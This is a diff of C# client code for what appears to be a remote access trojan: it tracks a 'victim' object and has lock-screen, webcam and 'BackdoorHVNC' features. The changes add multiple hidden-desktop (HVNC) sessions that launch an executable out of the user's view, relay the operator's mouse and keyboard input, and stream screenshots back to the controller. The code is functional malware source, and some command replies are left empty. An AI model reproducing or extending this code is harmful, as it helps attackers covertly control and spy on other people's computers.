@@ -205,6 +205,9 @@ namespace winClient48
         static Dictionary<string, PacketWriter> g_packetwriter = new Dictionary<string, PacketWriter>();
         List<frmLockScreen> l_frmLockScreen = new List<frmLockScreen>();
 
+        List<clsfnHvncSession> m_lsHVNC = new List<clsfnHvncSession>();
+
+
         //FUN STUFF
         static bool msg_inf = false;
 
@@ -233,8 +236,6 @@ namespace winClient48
         private clsfnRunScript funcRunScript;        //Run customized script.
         private clsfnFun funcFun;                    //Funny.
         private clsInstaller installer;              //Installer
-        
-        private clsfnHvncSession funcHvncSession  = new clsfnHvncSession("BackdoorHVNC");
 
         //WEBCAM
         static clsfnWebcam webcam;
@@ -294,6 +295,16 @@ namespace winClient48
             }
 
             return Marshal.PtrToStructure<T>(ptr);
+        }
+        private clsfnHvncSession fnGetHVNC(string szName)
+        {
+            foreach (var hvnc in m_lsHVNC)
+            {
+                if (string.Equals(szName, hvnc.m_szDesktopName))
+                    return hvnc;
+            }
+
+            return null;
         }
 
         #region Validation
@@ -1607,7 +1618,7 @@ namespace winClient48
                 {
                     if (cmd[1] == "init")
                     {
-                        DesktopInit(v);
+                        fnDesktopInit(v);
                     }
                     else if (cmd[1] == "start" || cmd[1] == "screenshot")
                     {
@@ -2974,27 +2985,78 @@ namespace winClient48
                     {
                         if (cmd[2] == "start")
                         {
+                            string szName = cmd[3];
+                            string szExe = cmd[4];
+                            int nDelay = int.Parse(cmd[5]);
 
+                            clsfnHvncSession hvnc = fnGetHVNC(szName);
+                            if (hvnc == null)
+                            {
+                                hvnc = new clsfnHvncSession(v, szName);
+                                m_lsHVNC.Add(hvnc);
+                                hvnc.fnCreate(szExe);
+                            }
+
+                            hvnc.m_bRunning = true;
+
+                            new Thread(() => hvnc.fnStart(nDelay)).Start();
+
+                            v.fnSendCommand(new string[]
+                            {
+
+                            });
                         }
                         else if (cmd[2] == "stop")
                         {
+                            string szName = cmd[3];
 
+                            var hvnc = fnGetHVNC(szName);
+                            if (hvnc == null)
+                                return;
+
+                            hvnc.m_bRunning = false;
+
+                            v.fnSendCommand(new string[]
+                            {
+
+                            });
                         }
                         else if (cmd[2] == "close")
                         {
+                            string szName = cmd[3];
+                            int nDelay = int.Parse(cmd[4]);
 
+                            var hvnc = fnGetHVNC(szName);
+                            if (hvnc == null)
+                                return;
+
+                            hvnc.m_bRunning = false;
+                            Thread.Sleep(nDelay * 2);
+
+                            hvnc.Dispose();
+                            m_lsHVNC.Remove(hvnc);
+
+                            v.fnSendCommand(new string[]
+                            {
+
+                            });
                         }
                     }
                     else if (cmd[1] == "mouse")
                     {
-                        string action = cmd[2]; // "MOVE", "LD", "LU", etc.
-                        int x = int.Parse(cmd[3]);
-                        int y = int.Parse(cmd[4]);
-                        int delta = int.Parse(cmd[5]); // "SC"
+                        string szName = cmd[2];
+                        string action = cmd[3]; // "MOVE", "LD", "LU", etc.
+                        int x = int.Parse(cmd[4]);
+                        int y = int.Parse(cmd[5]);
+                        int delta = int.Parse(cmd[6]); // "SC"
 
                         try
                         {
-                            funcHvncSession.fnHandleMouseInput(action, x, y);
+                            var hvnc = fnGetHVNC(szName);
+                            if (hvnc == null)
+                                return;
+
+                            hvnc.fnHandleMouseInput(action, x, y);
                         }
                         catch (Exception ex)
                         {
@@ -3003,12 +3065,17 @@ namespace winClient48
                     }
                     else if (cmd[1] == "keyboard")
                     {
-                        string action = cmd[2];
-                        int vk = int.Parse(cmd[3]);
+                        string szName = cmd[2];
+                        string action = cmd[3];
+                        int vk = int.Parse(cmd[4]);
 
                         try
                         {
-                            funcHvncSession.fnHandleKeyboardInput(action, vk);
+                            var hvnc = fnGetHVNC(szName);
+                            if (hvnc == null)
+                                return;
+
+                            hvnc.fnHandleKeyboardInput(action, vk);
                         }
                         catch (Exception ex)
                         {
@@ -3155,35 +3222,22 @@ namespace winClient48
         /// <param name="height"></param>
         void fnDesktopStart(clsVictim v, string device_name, int width, int height)
         {
-            funcHvncSession.fnStartExplorer();
-
             while (is_connected && send_screenshot)
             {
-                /*
                 Bitmap bmp = fnScreenShot(v, device_name, width, height);
                 string b64_img = clsGlobal.BitmapToBase64(bmp);
                 v.SendCommand("desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
-                */
-
-                Bitmap bmp = funcHvncSession.fnGetScreenshot(width, height);
-                string b64 = clsGlobal.BitmapToBase64(bmp);
-                v.fnSendCommand(new string[]
-                {
-                    "desktop",
-                    "start",
-                    b64,
-                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
-                });
 
                 Thread.Sleep(m_nDesktopDelay);
             }
+
             send_stopped = true;
         }
         /// <summary>
         /// Initialization of reomte desktop.
         /// </summary>
         /// <param name="v"></param>
-        static void DesktopInit(clsVictim v)
+        static void fnDesktopInit(clsVictim v)
         {
             List<string> result = new List<string>();
             foreach (var screen in Screen.AllScreens)
